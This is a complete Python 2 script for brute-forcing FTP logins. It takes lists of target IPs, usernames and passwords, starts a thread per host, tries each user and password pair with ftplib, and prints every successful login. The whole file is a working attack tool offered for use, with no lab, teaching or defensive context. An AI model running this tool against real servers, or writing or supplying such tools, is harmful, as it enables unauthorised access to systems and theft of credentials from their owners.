#!/usr/bin/env python2

import argparse, ftplib, sys, threading


class ftpbruter():
    def __init__(s):
        s.ips = []
        s.users = []
        s.passwds = []
        s.getargs()
        print("[.] Hosts: %d (threads)\n[.] Users: %d * Passwords: %d * Timeout: %d\n[.] Max_runtime: %d seconds\n" % (len(s.ips), len(s.users), len(s.passwds), s.timeout, (len(s.users) * len(s.passwds) * s.timeout)))
        for h in s.ips:
            threading.Thread(target=s.brute, args=(h,)).start()


    def brute(s,h):
        for u in s.users:
            print("[!] Trying: %s:%s" % (h,u))
            found=0
            for p in s.passwds:
                if found == 0:
                    try:
                        ftp = ftplib.FTP(h, timeout=int(s.timeout))
                        ftp.login(u,p)
                        print("[+] Login success:  %s:%s:%s" % (h,u,p))
                        ftp.quit()
                        found=1
                    except Exception, e:
                        if str(e) == "timed out":
                            # print("[-] %s:%s:%s : timed out" % (h,u,p))
                            pass
                        elif str(e).find("Connection refused") != -1:
                            print("[-] %s : Connection refused" % (h))
                            sys.exit() #thread.quit()
                        elif str(e).find("No route to host") != -1:
                            print("[-] %s : No route to host" % (h))
                            sys.exit() #thread,quit()
                        else:
                            pass


    def listparse(s, e, f):
        tmp = []
        x = open(f, 'r')
        for item in x:
            tmp.append(item.strip('\n'))
        for item in tmp:
            if not item == '' and not item == " " and not item.find(" ") != -1:
                e.append(item)
        
    def getargs(s):
        ap = argparse.ArgumentParser(description="FTP brute forcer")
        ap.add_argument('-i', '--ip', type=str, default=None, help="single IP")
        ap.add_argument('-I', '--ips', type=str, default=None, help="list of IPs")
        ap.add_argument('-u', '--user', type=str, default=None, help="single user")
        ap.add_argument('-U', '--users', type=str, default=None, help="list of users")
        ap.add_argument('-p', '--passwd', type=str, default=None, help="single password")
        ap.add_argument('-P', '--passwds', type=str, default=None, help="list of passwords")
        ap.add_argument('-t', '--timeout', type=int, default=10, help="connection timeout")
        args, l = ap.parse_known_args()
        if (args.ip == None and args.ips == None) or (args.user == None and args.users == None) or (args.passwd == None and args.passwds == None):
            ap.print_help()
            sys.exit()
        else:
            if not args.ip == None:
                s.ips.append(args.ip.strip('\n'))
            if not args.passwd == None:
                s.passwds.append(args.passwd.strip("\n"))
            if not args.user == None:
                s.users.append(args.user.strip("\n"))
            if not args.ips == None:
                s.listparse(s.ips, args.ips)
            if not args.users == None:
                s.listparse(s.users, args.users)
            if not args.passwds == None:
                s.listparse(s.passwds, args.passwds)
            s.timeout = args.timeout


def main():
    brute = ftpbruter()


if __name__=="__main__":
    main()


